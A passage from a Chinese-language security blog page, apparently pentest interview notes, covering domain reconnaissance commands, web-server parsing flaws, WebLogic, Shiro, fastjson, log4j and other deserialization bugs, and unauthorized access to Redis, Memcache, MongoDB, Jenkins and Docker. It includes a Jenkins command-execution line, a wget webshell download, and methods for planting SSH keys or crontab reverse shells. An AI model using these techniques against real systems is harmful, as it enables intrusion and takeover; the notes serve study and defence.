class="hljs-number">.174</span>.%I | findstr &quot;TTL=&quot;<br>ARP探测内网<br>端口信息收集 <br>查询域信息 net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span> <br>查询域主机 net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span>:XXX <br>查询域用户 net <span class="hljs-keyword">group</span> /<span class="hljs-keyword">domain</span> <br>查找域控 Nslookup -<span class="hljs-keyword">type</span>=SRV _ldap._tcp net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span> net <span class="hljs-keyword">group</span> &quot;Domain Controllers&quot; /<span class="hljs-keyword">domain</span><br><br>查域用户信息 net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span> <br>查询域管理员 net <span class="hljs-keyword">group</span> &quot;Domain Admins&quot; /<span class="hljs-keyword">domain</span><br>查询域sid信息 whoami /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>

<h1 id="0x03-框架与中间件"><a href="#0x03-框架与中间件" class="headerlink" title="0x03.框架与中间件"></a>0x03.框架与中间件</h1><h2 id="00-python哪些框架出现过漏洞"><a href="#00-python哪些框架出现过漏洞" class="headerlink" title="00-python哪些框架出现过漏洞?"></a>00-python哪些框架出现过漏洞?</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">flask的模板注入 <br>模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell等问题。<br>模板字符串中字符串拼接或替换可能会导致敏感信息泄露，获取变量值如果开发者在flask使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数，该函数不会对输入进行实体转义将URL传递进入模板内容当中，会导致xss的产生。<br>还可以利用模板中<span class="hljs-selector-tag">html</span>标签属性字段绕过xss过滤。<br>Django出现过目录遍历漏洞<br></code></pre></td></tr></table></figure>

<h2 id="01-常见的解析漏洞？"><a href="#01-常见的解析漏洞？" class="headerlink" title="01-常见的解析漏洞？"></a>01-常见的解析漏洞？</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a、IIS <span class="hljs-number">6.0</span>  /xx.asp/xx<span class="hljs-selector-class">.jpg</span> <span class="hljs-string">&quot;xx.asp&quot;</span>是文件夹名 <br>b、IIS <span class="hljs-number">7.0</span>/<span class="hljs-number">7.5</span> <br>默认Fast-CGI开启，直接在url中图片地址后面输入/<span class="hljs-number">1</span>.php，会把正常图片当成php解析 <br>c、Nginx 版本小于等于 <span class="hljs-number">0.8</span>.<span class="hljs-number">37</span>，利用方法和IIS7.<span class="hljs-number">0</span>/<span class="hljs-number">7.5</span>一样，Fast-CGI关闭情况下也可利用。空字节代码 xxx<span class="hljs-selector-class">.jpg</span><span class="hljs-selector-class">.php</span> <br>d、Apache上传的文件命名为：test<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.x1</span><span class="hljs-selector-class">.x2</span>.x3，Apache是从右往左判断后缀 <br>e、lighttpd xx.jpg/xx.php，<br></code></pre></td></tr></table></figure>

<h2 id="02-ISS服务器做哪些方面保护措施"><a href="#02-ISS服务器做哪些方面保护措施" class="headerlink" title="02-ISS服务器做哪些方面保护措施?"></a>02-ISS服务器做哪些方面保护措施?</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 保持 Windows 升级: <br><span class="hljs-bullet">2.</span> 使用 IIS 防范工具 <br><span class="hljs-bullet">3.</span> 移除缺省的 Web 站点 <br><span class="hljs-bullet">4.</span> 如果你并不需要 FTP 和 SMTP 服务，请卸载它们 <br><span class="hljs-bullet">5.</span> 有规则地检查你的管理员组和服务: <br><span class="hljs-bullet">6.</span> 严格控制服务器的写访问权限 <br><span class="hljs-bullet">7.</span> 设置复杂的密码 <br><span class="hljs-bullet">8.</span> 减少/排除 Web 服务器上的共享 <br><span class="hljs-bullet">9.</span> 禁用 TCP/IP 协议中的 NetBIOS: <br><span class="hljs-bullet">10.</span> 使用 TCP 端口阻塞 <br><span class="hljs-bullet">11.</span> 仔细检查<span class="hljs-emphasis">*.bat 和*</span>.exe 文件: 每周搜索一次<span class="hljs-emphasis">*.bat </span><br><span class="hljs-emphasis">12. 管理 IIS 目录安全: </span><br><span class="hljs-emphasis">13. 使用 NTFS 安全: </span><br><span class="hljs-emphasis">14. 管理用户账户 </span><br><span class="hljs-emphasis">15. 审计你的 Web 服务器: </span><br></code></pre></td></tr></table></figure>

<h2 id="03-struts2框架漏洞原理"><a href="#03-struts2框架漏洞原理" class="headerlink" title="03-struts2框架漏洞原理"></a>03-struts2框架漏洞原理</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">(<span class="hljs-number">1</span>)struts 是 java 的 web 框架<br>(<span class="hljs-number">2</span>)采取 OGNL 表达式，处理 view 层数据字符串到 controller 层转换成 java对象<br>(<span class="hljs-number">3</span>)重点关注的编号加粗如下<br></code></pre></td></tr></table></figure>

<h2 id="04-weblogic权限绕过"><a href="#04-weblogic权限绕过" class="headerlink" title="04-weblogic权限绕过"></a>04-weblogic权限绕过</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">14882</span>： <br>远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic 管理控制台。 攻击者可以构造特殊请求的URL，即可未授权访问到管理后台页面，访问后台后是一个低权限的用 户，无法安装应用， 也无法直接执行任意代码。 <br><br>#CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">14883</span>： 允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个HTTP 请求在远程Weblogic 服务器上以未授权的任意用户身份执行命令。 <br>#漏洞利用 <br>第一种方法是通过com<span class="hljs-selector-class">.tangosol</span><span class="hljs-selector-class">.coherence</span><span class="hljs-selector-class">.mvel2</span><span class="hljs-selector-class">.sh</span><span class="hljs-selector-class">.ShellSession</span> <br>第二种方法是通过 com<span class="hljs-selector-class">.bea</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.repackaged</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.FileSystemXmlApplic</span> ationContext<br></code></pre></td></tr></table></figure>

<h1 id="0x04-反序列化篇"><a href="#0x04-反序列化篇" class="headerlink" title="0x04.反序列化篇"></a>0x04.反序列化篇</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/f1183582abd42b6f4439285468f7a71e.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<h2 id="00-序列化和反序列化"><a href="#00-序列化和反序列化" class="headerlink" title="00-序列化和反序列化"></a>00-序列化和反序列化</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">序列化：把内存中的对象以二进制的形式保存在文本中（输出流）反序列化：把文本中的对象读出来到内存中（输入流）<br><br>反序列化用到的函数<br>序列化：serialize<br>反序列化：unserialize<br></code></pre></td></tr></table></figure>

<h2 id="01-常见反序列化的流量特征"><a href="#01-常见反序列化的流量特征" class="headerlink" title="01-常见反序列化的流量特征"></a>01-常见反序列化的流量特征</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">像这种st2 <span class="hljs-number">045</span>、<span class="hljs-number">068</span>、<span class="hljs-keyword">shiro反序列化、fastjson这些java反序列化一类的流量特征</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">shiro就看cookie中Rememberme字段，什么都要从这里传</span><br><span class="hljs-keyword"></span>fastjson：可以在提交的包中找找<span class="hljs-keyword">json格式的数据，重点看一下有无rmi或者出网的一些行为，（在十六进制中会呈现ACED开头，这段不确定）</span><br><span class="hljs-keyword"></span>st2<span class="hljs-number">-045</span>：请求头中的Content-Type字段 <br></code></pre></td></tr></table></figure>

<h2 id="02-log4j反序列化"><a href="#02-log4j反序列化" class="headerlink" title="02-log4j反序列化"></a>02-log4j反序列化</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">该漏洞主要是由于日志在打印时当遇到`$&#123;`后，以:号作为分割，将表达式内容分割成两部分，前面一部分<span class="hljs-built_in">prefix</span>，后面部分作为<span class="hljs-built_in">key</span>，然后通过<span class="hljs-built_in">prefix</span>去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将<span class="hljs-built_in">key</span>作为参数带入执行，引发远程代码执行漏洞<br><br>核心原理为，在正常的<span class="hljs-built_in">log</span>处理过程中对**$&#123;**这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发替换机制，将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行<br><br>日志在打印时当遇到$&#123;后，Interpolator类以:号作为分割，将表达式内容分割成两部分，前面部分作为 <span class="hljs-built_in">prefix</span>，后面部分作为 <span class="hljs-built_in">key</span>。然后通过<span class="hljs-built_in">prefix</span>去找对应的 lookup，通过对应的lookup实例调用lookup方法，最后将<span class="hljs-built_in">key</span>作为参数带入执行<br></code></pre></td></tr></table></figure>

<h2 id="03-Shiro反序列化漏洞"><a href="#03-Shiro反序列化漏洞" class="headerlink" title="03-Shiro反序列化漏洞"></a>03-Shiro反序列化漏洞</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">shiro提供记住密码功能，Payload产生的过程：命令=》序列化=》AES加密=》base64编码=》RememberMe </span>Cookie值<br>影响版本：Apache <span class="hljs-keyword">Shiro </span>&lt; <span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br>特征判断：返回包中包含rememberMe=deleteMe字段。<br>第二种 直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的cookie中增加字段：****rememberMe=然后查看返回数据包中是否存在关键字<br>利用：用生成的Payload，构造数据包，伪造cookie发送payload<br><span class="hljs-keyword">SHIRO-550：</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：</span><br><span class="hljs-keyword"></span>得到rememberMe的cookie值--&gt;<span class="hljs-keyword">Base64解码--&gt;AES解密--&gt;反序列化</span><br><span class="hljs-keyword"></span>AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞<br><span class="hljs-keyword">SHIRO-721反序列化漏洞</span><br><span class="hljs-keyword"></span>不需要key，利用Padding <span class="hljs-keyword">Oracle </span>Attack构造出RememberMe字段后段的值结合合法的RememberMe cookie即可完成攻击<br></code></pre></td></tr></table></figure>

<h2 id="04-weblogic有几种漏洞"><a href="#04-weblogic有几种漏洞" class="headerlink" title="04-weblogic有几种漏洞"></a>04-weblogic有几种漏洞</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs subunit">weblogic就好多了，基于T3协议的反序列化；基于xml解析时候造成的反序列化，还有ssrf，权限绕过等等<br>反序列化漏洞<br>Weblogic（及其他很多java服务器应用）在通信过程中传输数据对象，涉及到序列化和反序列化操 作，如果能找到某个类在反序列化过程中能执行某些奇怪的代码，就有可能通过控制这些代码达到RCE 的效果 <br><br>常见的weblogic漏洞 <br>1. #CVE<span class="hljs-string">-2016</span><span class="hljs-string">-0638</span> Weblogic 直接反序列化基于Weblogic t3协议引起远程代码执行的反序列化漏洞 漏洞实为CVE<span class="hljs-string">-2015</span><span class="hljs-string">-4852</span>绕过 拜Oracle一直以来的黑名单修复方式所赐 <br><br>2. #CVE<span class="hljs-string">-2016</span><span class="hljs-string">-3510</span> 基于Weblogic t3协议引起远程代码执行的反序列化漏洞 <br><br>3. #CVE<span class="hljs-string">-2017</span><span class="hljs-string">-3248</span> 基于Weblogic t3协议引起远程代码执行的反序列化漏洞 属于Weblogic JRMP反序列化 <br>4. #CVE<span class="hljs-string">-2018</span><span class="hljs-string">-2628</span> 基于Weblogic t3协议引起远程代码执行的反序列化漏洞 属于 Weblogic JRMP反序列化 <br>5. #CVE<span class="hljs-string">-2018</span><span class="hljs-string">-2893</span> 基于Weblogic t3协议引起远程代码执行的反序列化漏洞 实为CVE<span class="hljs-string">-2018</span><span class="hljs-string">-2628</span>绕过 同样拜Oracle一直以来的黑名单修复方式所赐 属于Weblogic JRMP反序列化<br></code></pre></td></tr></table></figure>

<h2 id="05-fastjson反序列化漏洞"><a href="#05-fastjson反序列化漏洞" class="headerlink" title="05-fastjson反序列化漏洞"></a>05-fastjson反序列化漏洞</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">正常请求是<span class="hljs-keyword">get</span>请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断<br>fastjson漏洞利用原理<br>在请求包里面中发送恶意的<span class="hljs-type">json</span>格式payload，漏洞在处理<span class="hljs-type">json</span>对象的时候，没有对@<span class="hljs-keyword">type</span>字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数<br>无回显怎么办<br><span class="hljs-number">1.</span>一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果<br><span class="hljs-number">2.</span>通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了<br><span class="hljs-number">3.</span>直接将命令执行结果回显到请求Poc的HTTP响应中<br></code></pre></td></tr></table></figure>

<h2 id="06-判断目标是否使用st2框架"><a href="#06-判断目标是否使用st2框架" class="headerlink" title="06-判断目标是否使用st2框架"></a>06-判断目标是否使用st2框架</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">一般st2开发的应用，会以.<span class="hljs-keyword">do</span>\.action为结尾后缀，但是spingweb同样可以这样结尾来定义相关接口，所以通过在相关接口追加actionErrors参数，st2应用会触发报错<br><br>而spring的话，类似<span class="hljs-keyword">user</span>.<span class="hljs-keyword">do</span>/的访问和<span class="hljs-keyword">user</span>.<span class="hljs-keyword">do</span>的结果一样<br>st2<span class="hljs-number">-045</span>这就是看Content-<span class="hljs-keyword">Type</span>，这部分是达到命令执行的部分<br></code></pre></td></tr></table></figure>

<h2 id="07-redis未授权与权限获取"><a href="#07-redis未授权与权限获取" class="headerlink" title="07-redis未授权与权限获取"></a>07-redis未授权与权限获取</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs awk">Redis默认情况下，会绑定在<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6379</span>，这样将会将Redis服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，可以成功在Redis服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器 <br><br>条件: <br>a、redis 服务以 root 账户运行 <br>b、redis 无密码或弱密码进行认证 <br>c、redis 监听在 <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> 公网上 <br><br>方法: <br>a、通过Redis的INFO命令，可以查看服务器相关的参数和敏感信息,为攻击者的后续渗透做铺垫 <br>b、上传SSH公钥获得SSH登录权限 <br>c、通过crontab反弹shell <br>d、slave主从模式利用 <br><br>修复：<br>密码验证 <br>降权运行 <br>限制 ip/修改端口 <br><span class="hljs-number">1</span>.redis写入webshell<br>服务端的redis链接存在未授权，在攻击机上面能用redis-cli直接登录链接，并未登录验证.<br><br><span class="hljs-number">2</span>.利用redis写入ssh公钥<br>服务端的redis连接存在未授权，在攻击机上面能用redis-cli直接登录链接 并未登录验证，服务端存在ssh目录并且有写入的权限.<br><br><span class="hljs-number">3</span>.redis写入计划任务<br>这个方法只能在Centos上使用，Ubuntu上是行不通的<br>原因如下: 因为默认redis写文件后是<span class="hljs-number">644</span>的权限，但ubuntu要求执行定时任务文 件<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs<span class="hljs-regexp">/&lt;username&gt;权限必须是600也就是-rw———-才会执行，否则会报 错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文 件/</span>var<span class="hljs-regexp">/spool/</span>cron/&lt;username&gt;权限<span class="hljs-number">644</span>也能执行因为redis保存RDB会存在乱码，在Ubuntu上 会报错，而在Centos上不会报错 然后由于系统的不同，crontrab定时文件位置也会不同<br></code></pre></td></tr></table></figure>

<h2 id="08-Memcache未授权访问"><a href="#08-Memcache未授权访问" class="headerlink" title="08-Memcache未授权访问"></a>08-Memcache未授权访问</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gauss">Memcached 是一套常用的 <span class="hljs-built_in">key</span>-value 缓存系统，由于它本身没有权限控制模块，所以对公网开放的 <br>Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读Memcached中的敏感信 息。<br>利用<br><span class="hljs-number">1</span>、登录机器执行 netstat -an |more 命令查看端口监听情况。回显 <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">11211</span> 表示在所有网卡进行 <br>监听，存在 memcached 未授权访问漏洞。 <br><span class="hljs-number">2</span>、telnet <span class="hljs-number">11211</span>，或 nc -vv <span class="hljs-number">11211</span>，提示连接成功表示漏洞存在 <br><br>漏洞加固 <br>a、设置 memchached 只允许本地访问 <br>b、禁止外网访问 Memcached <span class="hljs-number">11211</span> 端口 <br>c、编译时加上 –<span class="hljs-keyword">enable</span>-sasl，启用 SASL 认证FFMPEG 本地文件读取漏洞<br></code></pre></td></tr></table></figure>

<h2 id="09-MongoDB未授权访问"><a href="#09-MongoDB未授权访问" class="headerlink" title="09-MongoDB未授权访问"></a>09-MongoDB未授权访问</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">开启 MongoDB 服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的 用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。 <br>防护<br><span class="hljs-number">1</span>.为MongoDB添加认证：<br> <span class="hljs-number">1</span>)MongoDB 启动时添加–auth参数 <br> <span class="hljs-number">2</span>)给 MongoDB 添加用户：use admin<br>#使用admin库<span class="hljs-built_in">db</span><span class="hljs-number">.</span>addUser(“root”, “<span class="hljs-number">123456</span>”) #添加用户名root密码 <span class="hljs-number">123456</span>的用户<span class="hljs-built_in">db</span><span class="hljs-number">.</span>auth(“root”,“<span class="hljs-number">123456</span>”) #验证下是否添加成功，返回<span class="hljs-number">1</span>说明成功 <br><span class="hljs-number">2</span>.禁用HTTP和<span class="hljs-built_in">REST</span>端口 <br>MongoDB自身带有一个HTTP服务和并支持<span class="hljs-built_in">REST</span>接口。在<span class="hljs-number">2.6</span>以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过 web 方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择-nohttpinterface 参数nohttpinterface=false <br><span class="hljs-number">3</span>、限制绑定<span class="hljs-built_in">IP</span>启动时加入参数–bind_ip <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>或在/etc/mongodb<span class="hljs-number">.</span>conf 文件中添加以下内容：bind_ip = <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure>

<h2 id="10-Jenkins未授权访问"><a href="#10-Jenkins未授权访问" class="headerlink" title="10-Jenkins未授权访问"></a>10-Jenkins未授权访问</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">攻击者通过未授权访问进入脚本命令执行界面执行攻击指令 <br>println <span class="hljs-string">&quot;ifconfig -a&quot;</span>.<span class="hljs-built_in">execute</span>().text 执行一些系统命令,利用 wget 下载webshell<br></code></pre></td></tr></table></figure>

<h2 id="11-Java反序列化原理"><a href="#11-Java反序列化原理" class="headerlink" title="11-Java反序列化原理"></a>11-Java反序列化原理</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">（<span class="hljs-number">1</span>）<span class="hljs-keyword">Java </span>序列化指 <span class="hljs-keyword">Java </span>对象转换为字节序列的过程<br>（<span class="hljs-number">2</span>）<span class="hljs-keyword">Java </span>反序列化指字节序列恢复为 <span class="hljs-keyword">Java </span>对象的过程<br>（<span class="hljs-number">3</span>） Commons-collections 爆出第一个漏洞开始，<span class="hljs-keyword">Java </span>反序列化漏洞的<br>事件就层出不穷。<br>（<span class="hljs-number">4</span>）在 <span class="hljs-keyword">Java </span>中,利用 ObjectInputStream 的 readObject 方法进行对象读取<br>（<span class="hljs-number">5</span>）可以深入了解 ysoserial有哪些 gadgets<br></code></pre></td></tr></table></figure>

<h2 id="12-Docker-远程API漏洞"><a href="#12-Docker-远程API漏洞" class="headerlink" title="12-Docker 远程API漏洞"></a>12-Docker 远程API漏洞</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-number">1</span>-docker swarm 是一个将docker集群变成单一虚拟的docker host 工<br>具，使用标准的DockerAPI，能够方便docker集群的管理和扩展，该未授<br>权访问,可以通过url操作，执行docker命令。<br><br><span class="hljs-number">2</span>-通过docker client执行目标服务器容器命令，docker是以root权限运行的<br><br>一、有运行 ssh 服务，<span class="hljs-regexp">/root/</span>.ssh 目录挂载到 container 内，，然后修改<br><span class="hljs-regexp">/.ssh/</span>authorized_keys 文件，把自己的 <span class="hljs-keyword">public</span> key 写进去<br>二、没有运行 ssh 服务，利用挂载写 crontab 定时任务，反弹一个 shell<br></code></pre></td></tr></table></figure>

<h2 id="13-Jboss反序列化漏洞"><a href="#13-Jboss反序列化漏洞" class="headerlink" title="13-Jboss反序列化漏洞"></a>13-Jboss反序列化漏洞</h2><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">jboss的反序列化漏洞出现在jboss\server\all\deploy\httpha- invoker.sar\invoker.war\WEB-INF\classes\org\jboss\invocation\http\servlet目录下的ReadOnlyAccessFilter.<span class="hljs-keyword">class</span>文件中的doFilter中。 程序获取http数据保存到了httpRequest中，序列化后保存到了ois中，然后没有进行过滤操作，直接 使用了readObject（）进行了反序列化操作保存到了mi变量中，这其实就是一个典型的java反序列化漏洞<br></code></pre></td></tr></table></figure>

<h2 id="14-Python反序列化"><a href="#14-Python反序列化" class="headerlink" title="14.Python反序列化"></a>14.Python反序列化</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程，Python反序列化后产生的对象会在结束时触发<span class="hljs-built_in">__reduce__</span>()函数从而触发恶意代码。<br><br>防御：<br><span class="hljs-number">1</span>、用更高级的接口<span class="hljs-built_in">__getnewargs</span>()、<span class="hljs-built_in">getstate</span>()、<span class="hljs-built_in">setstate</span>()等代替<span class="hljs-built_in">reduce</span>()魔术方法；<br><span class="hljs-number">2</span>、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。<br></code></pre></td></tr></table></figure>

<h2 id="15-PHP反序列化"><a href="#15-PHP反序列化" class="headerlink" title="15.PHP反序列化"></a>15.PHP反序列化</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs scss">php反序列化漏洞，又叫php对象注入漏洞 是因为程序对输入数据处理不当导致的。<br><br>php中有两个函数<span class="hljs-built_in">serialize</span>() 和<span class="hljs-built_in">unserialize</span>()。<br><br>反序列常见魔术函数<br>__sleep<br>在使用 <span class="hljs-built_in">serialize</span>() 函数时，程序会检查类中是否存在一个 <span class="hljs-built_in">__sleep</span>() 魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。<br>__wakeup<br>在使用 <span class="hljs-built_in">unserialize</span>() 时，会检查是否存在一个 <span class="hljs-built_in">__wakeup</span>() 魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。<br><span class="hljs-built_in">__toString</span>() <br> 方法用于定义一个类被当成字符串时该如何处理。<br>__invoke<br>当尝试以调用函数的方式调用一个对象时， <span class="hljs-built_in">__invoke</span>() 方法会被自动调用。(本特性只在 PHP <span class="hljs-number">5.3</span>.<span class="hljs-number">0</span> 及以上版本有效。)<br>__construct<br>具有 __construct 函数的类会在每次创建新对象时先调用此方法，适合在使用对象之前做一些初始化工作。<br><br>利用方式：<br><span class="hljs-number">1</span><span class="hljs-selector-class">.__wakeup</span>( )绕过    (CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">7124</span>)<br>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<span class="hljs-built_in">__wakeup</span>( )的执行。<br>影响版本：<br>PHP before <span class="hljs-number">5.6</span><span class="hljs-selector-class">.25</span><br><span class="hljs-number">7</span><span class="hljs-selector-class">.x</span> before <span class="hljs-number">7.0</span><span class="hljs-selector-class">.10</span><br><br><span class="hljs-number">2</span>.注入对象构造方法<br><span class="hljs-number">3</span><span class="hljs-selector-class">.Session</span>反序列化漏洞<br><span class="hljs-number">4</span><span class="hljs-selector-class">.PHAR</span>利用<br></code></pre></td></tr></table></figure>

